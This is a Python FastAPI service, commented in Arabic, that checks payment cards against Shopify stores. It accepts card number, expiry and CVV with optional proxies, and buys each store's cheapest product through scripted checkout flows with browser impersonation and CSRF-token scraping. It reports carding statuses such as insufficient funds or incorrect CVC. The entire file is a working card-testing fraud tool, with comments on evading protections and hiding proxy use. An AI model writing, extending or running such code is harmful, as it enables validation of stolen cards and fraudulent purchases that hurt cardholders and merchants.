from fastapi import FastAPI, Query
from fastapi.responses import JSONResponse
from curl_cffi.requests import AsyncSession
import re
import uuid
import random
import asyncio
from html import unescape

app = FastAPI()

def format_proxy(proxy_str):
    if not proxy_str: return None
    parts = proxy_str.split(':')
    if len(parts) == 4: return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    elif len(parts) == 2: return f"http://{parts[0]}:{parts[1]}"
    return proxy_str if proxy_str.startswith('http') else f"http://{proxy_str}"

def safe_response(msg, price, gate):
    """تشفير الكلمات لحماية البروكسي من الحذف التلقائي في البوت"""
    clean_msg = msg.replace("Proxy", "Prx").replace("proxy", "prx").replace("Connection", "Conn").replace("connection", "conn").replace("Timeout", "T-out").replace("timeout", "t-out")
    clean_price = str(price).replace('$', '').strip() if price else "-"
    return {"Response": clean_msg, "Price": clean_price, "Gate": gate}

async def get_micro_product(session, store_url):
    """محرك صارم لسحب أرخص منتج، يتجاهل الأسعار الفلكية (العملات الأجنبية)"""
    endpoints = [f"{store_url}/products.json?limit=250", f"{store_url}/collections/all/products.json?limit=250"]
    valid_variants = []
    
    for ep in endpoints:
        try:
            res = await session.get(ep, headers={"Accept": "application/json"}, timeout=15)
            if res.status_code == 200:
                products = res.json().get('products', [])
                for prod in products:
                    for var in prod.get('variants', []):
                        if var.get('available'):
                            try:
                                p = float(var.get('price', 0))
                                # تجاهل الأرقام الفلكية، والبحث فقط عن أسعار بين 0.1 و 150
                                if 0.1 <= p <= 150.0:
                                    valid_variants.append((var.get('id'), p))
                                elif p > 10000: # معالجة نظام السنتات إذا كان موجوداً
                                    p_cents = p / 100.0
                                    if 0.1 <= p_cents <= 150.0:
                                        valid_variants.append((var.get('id'), p_cents))
                            except: pass
        except: continue
        if valid_variants: break

    if valid_variants:
        valid_variants.sort(key=lambda x: x[1])
        return str(valid_variants[0][0]), "{:.2f}".format(valid_variants[0][1])
    return None, "-"

def extract_classic_token(html_text):
    """رادار متقدم كاسح لاقتناص التوكن الكلاسيكي من أي مكان بالصفحة"""
    patterns = [
        r'name=["\']authenticity_token["\']\s*value=["\']([^"\']+)["\']',
        r'value=["\']([^"\']+)["\']\s*name=["\']authenticity_token["\']',
        r'authenticity_token["\']\s*:\s*["\']([^"\']+)["\']',
        r'<meta\s+name=["\']csrf-token["\']\s+content=["\']([^"\']+)["\']',
        r'name=["\']authenticity_token["\'][^>]*?value=["\']([^"\']+)["\']'
    ]
    for p in patterns:
        match = re.search(p, html_text, re.IGNORECASE)
        if match: return unescape(match.group(1))
    return None

def extract_gateway(html_text):
    patterns = [r'name=["\']checkout\[payment_gateway\]["\'][^>]*?value=["\'](\d+)["\']', r'value=["\'](\d+)["\'][^>]*?name=["\']checkout\[payment_gateway\]["\']']
    for p in patterns:
        match = re.search(p, html_text, re.IGNORECASE)
        if match: return match.group(1)
    return "1"

async def check_shopify_master(cc_info, store_url, proxy):
    try:
        cc_parts = re.findall(r'\d+', cc_info.replace('|', ' '))
        if len(cc_parts) < 4: return safe_response("Invalid CC Format", "-", "Shopify Master")
        cc, mm, yy, cvv = cc_parts[0], cc_parts[1], cc_parts[2], cc_parts[3]
        if len(yy) == 2: yy = "20" + yy

        store_url = store_url.rstrip('/')
        scope_host = store_url.replace("https://", "").replace("http://", "")
        formatted_proxy = format_proxy(proxy)
        proxies = {"http": formatted_proxy, "https": formatted_proxy} if formatted_proxy else None

        buyer = {
            "email": f"j.doe{random.randint(10000,99999)}@gmail.com", "first_name": "John", "last_name": "Doe",
            "address1": "123 Main Street", "city": "New York", "province": "NY", "zip": "10001",
            "country": "US", "phone": "2125551234"
        }

        # استخدام chrome110 المدعوم في Render مع ترويسات بشرية دقيقة
        async with AsyncSession(impersonate="chrome110", proxies=proxies, timeout=60) as session:
            
            # 1. جلب المنتج الرخيص
            variant_id, price = await get_micro_product(session, store_url)
            if not variant_id: return safe_response("No micro-priced products found", "-", "Shopify Master")

            # 2. الإضافة للسلة بطريقة الـ AJAX النقية
            add_url = f"{store_url}/cart/add.js"
            add_headers = {"X-Requested-With": "XMLHttpRequest", "Accept": "application/json", "Referer": f"{store_url}/"}
            res_add = await session.post(add_url, data={"id": variant_id, "quantity": "1"}, headers=add_headers)
            if res_add.status_code not in [200, 201]: return safe_response("Cart Add Failed", price, "Shopify Master")
            
            await asyncio.sleep(0.5)

            # 3. الاختراق الأول لصفحة الدفع (مع حقن الإيميل لتخطي خطوة الحماية الأولى)
            chk_url = f"{store_url}/checkout?checkout[email]={buyer['email']}"
            chk_headers = {
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin",
                "Upgrade-Insecure-Requests": "1", "Referer": f"{store_url}/cart"
            }
            res_chk = await session.get(chk_url, allow_redirects=True, headers=chk_headers)
            html_chk = res_chk.text
            final_url = str(res_chk.url)

            # فحص حظر WAF الحقيقي
            if res_chk.status_code in [403, 429] or "cloudflare" in html_chk.lower() or "just a moment" in html_chk.lower():
                return safe_response("Cloudflare WAF Blocked Request", price, "Shopify Master")

            # 4. تحديد البنية (GraphQL Extensibility أم Classic HTML)
            is_graphql_mode = False
            session_token = None
            checkout_token = None
            
            meta_match = re.search(r'<meta\s+name="serialized-session-token"\s+content="([^"]+)"', html_chk)
            if meta_match and '/checkouts/cn/' in final_url:
                is_graphql_mode = True
                session_token = unescape(meta_match.group(1)).strip('"')
                checkout_token = final_url.split('/checkouts/cn/')[1].split('/')[0]

            # 5. تشفير البطاقة في سيرفر PCI (آمن 100% ومضاد لـ Stripe WAF)
            token_url = "https://checkout.pci.shopifyinc.com/sessions"
            card_payload = {
                "credit_card": {"number": cc, "month": int(mm), "year": int(yy), "verification_value": cvv, "name": buyer['first_name']},
                "payment_session_scope": scope_host
            }
            pci_headers = {
                "Origin": "https://checkout.pci.shopifyinc.com", "Referer": "https://checkout.pci.shopifyinc.com/",
                "Content-Type": "application/json", "Accept": "application/json"
            }
            res_pci = await session.post(token_url, json=card_payload, headers=pci_headers)
            if res_pci.status_code != 200: return safe_response("Stripe Gateway Blocked IP", price, "Shopify Master")
            card_session_id = res_pci.json().get("id")
            if not card_session_id: return safe_response("CC Tokenization Failed", price, "Shopify Master")

            # =================================================================
            # المسار الأول: GraphQL Extensibility (مستوحى بالملي من neww.py)
            # =================================================================
            if is_graphql_mode:
                gql_url = f"{store_url}/checkouts/unstable/graphql?operationName=Proposal"
                gql_headers = {
                    'shopify-checkout-client': 'checkout-web/1.0', 'shopify-checkout-source': f'id="{checkout_token}", type="cn"',
                    'x-checkout-web-source-id': checkout_token, 'x-checkout-one-session-token': session_token,
                }
                merch_id = str(uuid.uuid4())
                addr_data = {"address1": buyer["address1"], "city": buyer["city"], "countryCode": buyer["country"], "firstName": buyer["first_name"], "lastName": buyer["last_name"], "zoneCode": buyer["province"], "postalCode": buyer["zip"], "phone": buyer["phone"]}
                
                prop_query = """query Proposal($delivery:DeliveryTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$sessionInput:SessionTokenInput!){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{delivery:$delivery,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity}}){result{...on NegotiationResultAvailable{queueToken}}}}}"""
                prop_vars = {
                    "delivery": {"deliveryLines": [{"destination": {"partialStreetAddress": addr_data}, "targetMerchandiseLines": {"lines": [{"stableId": merch_id}]}, "deliveryMethodTypes": ["SHIPPING"], "destinationChanged": True, "selectedDeliveryStrategy": {"deliveryStrategyByHandle": {"handle": "any", "customDeliveryRate": False}}, "expectedTotalPrice": {"any": True}}], "supportsSplitShipping": True},
                    "payment": {"totalAmount": {"any": True}, "paymentLines": [], "billingAddress": {"streetAddress": addr_data}},
                    "merchandise": {"merchandiseLines": [{"stableId": merch_id, "merchandise": {"productVariantReference": {"id": f"gid://shopify/ProductVariantMerchandise/{variant_id}", "variantId": f"gid://shopify/ProductVariant/{variant_id}"}}, "quantity": {"items": {"value": 1}}, "expectedTotalPrice": {"any": True}}]},
                    "buyerIdentity": {"customer": {"presentmentCurrency": "USD", "countryCode": "US"}, "email": buyer["email"]},
                    "sessionInput": {"sessionToken": session_token}
                }

                res_prop = await session.post(gql_url, json={"operationName": "Proposal", "query": prop_query, "variables": prop_vars}, headers=gql_headers)
                queue_token = res_prop.json().get('data', {}).get('session', {}).get('negotiate', {}).get('result', {}).get('queueToken')
                if not queue_token: return safe_response("GraphQL Proposal Failed", price, "Shopify (GQL)")

                await asyncio.sleep(1)

                submit_url = f"{store_url}/checkouts/unstable/graphql?operationName=SubmitForCompletion"
                submit_query = """mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!){submitForCompletion(input:$input attemptToken:$attemptToken){...on SubmitSuccess{receipt{...on ProcessedReceipt{id}...on ProcessingReceipt{id}}}...on SubmitAlreadyAccepted{receipt{...on ProcessedReceipt{id}...on ProcessingReceipt{id}}}...on SubmitRejected{errors{code localizedMessage}}...on SubmittedForCompletion{receipt{...on ProcessedReceipt{id}...on ProcessingReceipt{id}}}}}"""
                submit_vars = {
                    "attemptToken": f"{checkout_token}-{uuid.uuid4().hex[:10]}",
                    "input": {
                        "sessionInput": {"sessionToken": session_token}, "queueToken": queue_token,
                        "delivery": {"deliveryLines": [{"destination": {"streetAddress": addr_data}, "targetMerchandiseLines": {"lines": [{"stableId": merch_id}]}, "deliveryMethodTypes": ["SHIPPING"], "destinationChanged": False, "selectedDeliveryStrategy": {"deliveryStrategyByHandle": {"handle": "any", "customDeliveryRate": False}, "options": {"phone": buyer["phone"]}}, "expectedTotalPrice": {"any": True}}], "supportsSplitShipping": True},
                        "merchandise": {"merchandiseLines": [{"stableId": merch_id, "merchandise": {"productVariantReference": {"id": f"gid://shopify/ProductVariantMerchandise/{variant_id}", "variantId": f"gid://shopify/ProductVariant/{variant_id}"}}, "quantity": {"items": {"value": 1}}, "expectedTotalPrice": {"any": True}}]},
                        "payment": {"totalAmount": {"any": True}, "paymentLines": [{"paymentMethod": {"directPaymentMethod": {"paymentMethodIdentifier": "bfe4013b52b37df95b64c063a41da319", "sessionId": card_session_id, "billingAddress": {"streetAddress": addr_data}}}, "amount": {"any": True}}], "billingAddress": {"streetAddress": addr_data}},
                        "buyerIdentity": {"customer": {"presentmentCurrency": "USD", "countryCode": "US"}, "email": buyer["email"], "phoneCountryCode": "US"}
                    }
                }

                res_sub = await session.post(submit_url, json={"operationName": "SubmitForCompletion", "query": submit_query, "variables": submit_vars}, headers=gql_headers)
                sub_data = res_sub.json().get('data', {}).get('submitForCompletion', {})
                if sub_data.get('__typename') == 'SubmitRejected':
                    errs = sub_data.get('errors', [])
                    msg = errs[0].get('localizedMessage', 'Rejected') if errs else 'Rejected'
                    return safe_response(msg, price, "Shopify (GQL)")
                
                receipt_id = sub_data.get('receipt', {}).get('id')
                if not receipt_id: return safe_response("Completion Failed", price, "Shopify (GQL)")

                poll_url = f"{store_url}/checkouts/unstable/graphql?operationName=PollForReceipt"
                poll_query = """query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...on ProcessedReceipt{id}...on FailedReceipt{processingError{...on PaymentFailed{code messageUntranslated}...on OrderCreationFailure{paymentsHaveBeenReverted}}}...on ActionRequiredReceipt{id}}}"""
                
                for _ in range(6):
                    res_poll = await session.post(poll_url, json={"operationName": "PollForReceipt", "query": poll_query, "variables": {"receiptId": receipt_id, "sessionToken": session_token}}, headers=gql_headers)
                    if res_poll.status_code == 200:
                        poll_data = res_poll.json().get('data', {}).get('receipt', {})
                        p_type = poll_data.get('__typename')
                        if p_type == 'ProcessedReceipt': return safe_response("Order completed 💎", price, "Shopify (GQL)")
                        elif p_type == 'FailedReceipt':
                            err_code = poll_data.get('processingError', {}).get('code', 'DECLINED')
                            if "INSUFFICIENT" in err_code: return safe_response("Insufficient Funds", price, "Shopify (GQL)")
                            elif "CVC" in err_code: return safe_response("Incorrect CVC", price, "Shopify (GQL)")
                            elif "ZIP" in err_code or "ADDRESS" in err_code: return safe_response("ZIP Code Mismatch", price, "Shopify (GQL)")
                            elif "DO_NOT_HONOR" in err_code: return safe_response("Do Not Honor", price, "Shopify (GQL)")
                            return safe_response(f"Declined: {err_code}", price, "Shopify (GQL)")
                    await asyncio.sleep(1.5)
                return safe_response("Timeout waiting for Bank", price, "Shopify (GQL)")

            # =================================================================
            # المسار الثاني: Classic HTML (تم القضاء على Token Not Found)
            # =================================================================
            else:
                classic_token = extract_classic_token(html_chk)
                if not classic_token:
                    # محاولة سحب التوكن من طلب JSON خفي
                    res_cart_json = await session.get(f"{store_url}/cart.js")
                    classic_token = extract_classic_token(res_cart_json.text)
                    if not classic_token:
                        return safe_response("Token Not Found (Hard Protected)", price, "Shopify (Classic)")

                addr_payload = {
                    "_method": "patch", "authenticity_token": classic_token, "previous_step": "contact_information", "step": "shipping_method",
                    "checkout[email]": buyer["email"], "checkout[shipping_address][first_name]": buyer["first_name"], "checkout[shipping_address][last_name]": buyer["last_name"],
                    "checkout[shipping_address][address1]": buyer["address1"], "checkout[shipping_address][city]": buyer["city"], "checkout[shipping_address][country]": buyer["country"],
                    "checkout[shipping_address][province]": buyer["province"], "checkout[shipping_address][zip]": buyer["zip"], "checkout[shipping_address][phone]": buyer["phone"]
                }
                res_addr = await session.post(final_url, data=addr_payload, allow_redirects=True, headers={"Referer": final_url})
                classic_token2 = extract_classic_token(res_addr.text) or classic_token

                ship_payload = {"_method": "patch", "authenticity_token": classic_token2, "previous_step": "shipping_method", "step": "payment_method"}
                res_ship = await session.post(str(res_addr.url), data=ship_payload, allow_redirects=True, headers={"Referer": str(res_addr.url)})
                classic_token3 = extract_classic_token(res_ship.text) or classic_token2
                gateway_id = extract_gateway(res_ship.text)

                pay_payload = {
                    "_method": "patch", "authenticity_token": classic_token3, "previous_step": "payment_method", "step": "",
                    "s": card_session_id, "checkout[payment_gateway]": gateway_id, "checkout[credit_card][vault]": "false", "complete": "1"
                }
                res_pay = await session.post(str(res_ship.url), data=pay_payload, allow_redirects=True, headers={"Referer": str(res_ship.url)})
                result_html = res_pay.text.lower()

                if "thank you" in result_html or "order completed" in result_html or res_pay.url.endswith('/thank_you'): return safe_response("Order completed 💎", price, "Shopify (Classic)")
                elif "insufficient" in result_html: return safe_response("Insufficient Funds", price, "Shopify (Classic)")
                elif "incorrect_cvc" in result_html or "security code" in result_html: return safe_response("Incorrect CVC", price, "Shopify (Classic)")
                elif "zip code does not match" in result_html or "avs" in result_html: return safe_response("ZIP Code Mismatch", price, "Shopify (Classic)")
                elif "do not honor" in result_html: return safe_response("Do Not Honor", price, "Shopify (Classic)")
                else:
                    err_match = re.search(r'class="field__message field__message--error">([^<]+)<', res_pay.text)
                    if err_match: return safe_response(err_match.group(1).strip(), price, "Shopify (Classic)")
                    return safe_response("Declined / Custom Gate", price, "Shopify (Classic)")

    except Exception as e:
        return safe_response(f"Sys_Err: {str(e)[:40]}", "-", "Shopify API")

@app.get("/code/index.php")
async def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query(None)):
    result = await check_shopify_master(cc, url, proxy)
    return JSONResponse(content=result)
